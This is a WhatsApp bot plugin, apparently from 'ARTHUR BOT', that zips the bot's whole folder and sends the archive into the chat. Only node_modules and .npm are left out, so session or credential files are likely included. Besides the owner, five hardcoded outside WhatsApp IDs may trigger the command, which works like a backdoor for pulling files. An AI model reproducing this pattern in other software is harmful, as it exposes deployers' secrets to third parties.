// plugins/سكربتي.js
// ✧ 𝐀𝐑𝐓𝐇𝐔𝐑 𝐁𝐎𝐓 - استخراج ملفات البوت 📦

import fs from 'fs'
import path from 'path'
import { fileURLToPath } from 'url'
import { dirname } from 'path'
import { exec } from 'child_process'

const __filename = fileURLToPath(import.meta.url)
const __dirname = dirname(__filename)

// ═════════════════════════════════════
// 👑 المطورين المسموح لهم
// ═════════════════════════════════════

const allowedNumbers = [
    '185899757400132@s.whatsapp.net',
    '35984058130514@s.whatsapp.net',
    '116853997338673@s.whatsapp.net',
    '135974805860531@s.whatsapp.net',
    '233144431206490@s.whatsapp.net'
]

const cleanNum = (v) => String(v || '').split('@')[0].split(':')[0].replace(/\D/g, '')

const handler = async (m, { conn, isOwner, isROwner }) => {

    // ═════════════════════════════════════
    // 🔐 التحقق من المطور
    // ═════════════════════════════════════

    const senderNum = cleanNum(m.sender)
    const botJidNum = cleanNum(conn?.user?.jid || conn?.user?.id)
    const botLidNum = cleanNum(conn?.user?.lid)
    const allowedNums = allowedNumbers.map(n => cleanNum(n)).filter(Boolean)

    const isAllowed = Boolean(
        isROwner ||
        isOwner ||
        m.fromMe ||
        allowedNumbers.includes(m.sender) ||
        (senderNum && (
            allowedNums.includes(senderNum) ||
            senderNum === botJidNum ||
            (botLidNum && senderNum === botLidNum)
        ))
    )

    if (!isAllowed) {

        await conn.sendMessage(
            m.chat,
            {
                text:
`*◇❐ ═━━╾ 🔒 ╼━━═ ❐◇*
*┃* ── 🛑 🛡️  ◈ ──
*┃ *🚫 الصلاحية:* هذا الأمر للمطورين فقط
*┃ *👑 النظام:* 𝐀𝐑𝐓𝐇𝐔𝐑 𝐁𝐎𝐓
*◇❐ ═━━╾ ✦ ╼━━═ ❐◇*`
            },
            { quoted: m }
        )

        return
    }

    try {

        const botFolderPath =
            path.join(__dirname, '../')

        const zipFilePath =
            path.join(__dirname, '../bot_files.zip')

        // ═════════════════════════════════════
        // 📂 قراءة الملفات
        // ═════════════════════════════════════

        const initialMessage =
            await conn.sendMessage(
                m.chat,
                {
                    text:
`*◇❐ ═━━╾ 📂 ╼━━═ ❐◇*
*┃* ── 🔍 📜  ✦ ──
*┃ *⚙️ الحالة:* جاري فحص وقراءة ملفات البوت
*◇❐ ═━━╾ ✦ ╼━━═ ❐◇*`
                },
                { quoted: m }
            )

        console.log(
            `𝐀𝐑𝐓𝐇𝐔𝐑 𝐁𝐎𝐓: Reading files from ${botFolderPath}`
        )

        const files =
            fs.readdirSync(botFolderPath)

        if (files.length === 0) {

            await conn.sendMessage(
                m.chat,
                {
                    text:
`*◇❐ ═━━╾ ⚠️ ╼━━═ ❐◇*
*┃* ── 📭 🧩  ◈ ──
*┃ *📁 التنبيه:* لا توجد ملفات لضغطها
*◇❐ ═━━╾ ✦ ╼━━═ ❐◇*`,
                    edit: initialMessage.key
                },
                { quoted: m }
            )

            return
        }

        // ═════════════════════════════════════
        // 📦 تجهيز الضغط
        // ═════════════════════════════════════

        const zippingMessage =
            await conn.sendMessage(
                m.chat,
                {
                    text:
`*◇❐ ═━━╾ 📦 ╼━━═ ❐◇*
*┃* ── 📊 🗂️  ✦ ──
*┃ *📁 العناصر:* تم العثور على ${files.length} ملف/مجلد
*┃ *⚙️ الحالة:* جاري تجهيز أرشيف ZIP
*◇❐ ═━━╾ ✦ ╼━━═ ❐◇*`,
                    edit: initialMessage.key
                },
                { quoted: m }
            )

        const zipCommand =
            `zip -r "${zipFilePath}" . -x ".npm/*" "node_modules/*" "bot_files.zip"`

        const processingMessage =
            await conn.sendMessage(
                m.chat,
                {
                    text:
`*◇❐ ═━━╾ ⏳ ╼━━═ ❐◇*
*┃* ── ⚙️ 🗜️  ◈ ──
*┃ *📦 الضغط:* يتم الآن ضغط ملفات السكربت
*◇❐ ═━━╾ ✦ ╼━━═ ❐◇*`,
                    edit: zippingMessage.key
                },
                { quoted: m }
            )

        // ═════════════════════════════════════
        // 🚀 إنشاء ZIP
        // ═════════════════════════════════════

        exec(
            zipCommand,
            {
                cwd: botFolderPath
            },
            async (error) => {

                if (error) {

                    await conn.sendMessage(
                        m.chat,
                        {
                            text:
`*◇❐ ═━━╾ ❌ ╼━━═ ❐◇*
*┃* ── 💥 🔧  ◈ ──
*┃ *⚠️ الخطأ:* تعذر إنشاء ملف ZIP
*┃ *📜 التفاصيل:* ${error.message}
*◇❐ ═━━╾ ✦ ╼━━═ ❐◇*`,
                            edit: processingMessage.key
                        },
                        { quoted: m }
                    )

                    return
                }

                if (!fs.existsSync(zipFilePath)) {

                    await conn.sendMessage(
                        m.chat,
                        {
                            text:
`*◇❐ ═━━╾ ❌ ╼━━═ ❐◇*
*┃* ── 📭 🗜️  ◈ ──
*┃ *⚠️ النتيجة:* لم يتم العثور على ملف ZIP بعد الضغط
*◇❐ ═━━╾ ✦ ╼━━═ ❐◇*`,
                            edit: processingMessage.key
                        },
                        { quoted: m }
                    )

                    return
                }

                // ═════════════════════════════════════
                // 📤 إرسال الملف
                // ═════════════════════════════════════

                const sendingMessage =
                    await conn.sendMessage(
                        m.chat,
                        {
                            text:
`*◇❐ ═━━╾ 📤 ╼━━═ ❐◇*
*┃* ── ✅ 🎁  ✦ ──
*┃ *📦 الأرشيف:* تم إنشاء ملف ZIP بنجاح
*┃ *🚀 الإرسال:* جاري إرسال ملفات البوت
*◇❐ ═━━╾ ✦ ╼━━═ ❐◇*`,
                            edit: processingMessage.key
                        },
                        { quoted: m }
                    )

                await conn.sendMessage(
                    m.chat,
                    {
                        document:
                            fs.readFileSync(zipFilePath),

                        mimetype:
                            'application/zip',

                        fileName:
                            'ARTHUR_BOT_FILES.zip'
                    },
                    { quoted: m }
                )

                // ═════════════════════════════════════
                // 🗑️ حذف الملف المؤقت
                // ═════════════════════════════════════

                fs.unlink(
                    zipFilePath,
                    async (err) => {

                        if (!err) {

                            await conn.sendMessage(
                                m.chat,
                                {
                                    text:
`*◇❐ ═━━╾ 🧹 ╼━━═ ❐◇*
*┃* ── ✨ 🗑️  ✦ ──
*┃ *📤 التسليم:* تم إرسال السكربت بنجاح
*┃ *🗂️ التنظيف:* تم حذف الملف المؤقت
*◇❐ ═━━╾ ✦ ╼━━═ ❐◇*`,
                                    edit: sendingMessage.key
                                },
                                { quoted: m }
                            )
                        }
                    }
                )
            }
        )

    } catch (err) {

        console.error(
            '❌ ARTHUR BOT SCRIPT ERROR:',
            err
        )

        await conn.sendMessage(
            m.chat,
            {
                text:
`*◇❐ ═━━╾ ❌ ╼━━═ ❐◇*
*┃* ── 💥 🛠️  ◈ ──
*┃ *⚠️ الخطأ:* فشل في معالجة ملفات البوت
*┃ *📜 التفاصيل:* ${err.message}
*◇❐ ═━━╾ ✦ ╼━━═ ❐◇*`
            },
            { quoted: m }
        )
    }
}

handler.help = ['本', 'هون', '写', 'شا']
handler.category = 'المطور'
handler.tags = ['owner', 'المطور']
handler.command = /^(本|هون|写|شا)$/i

export default handler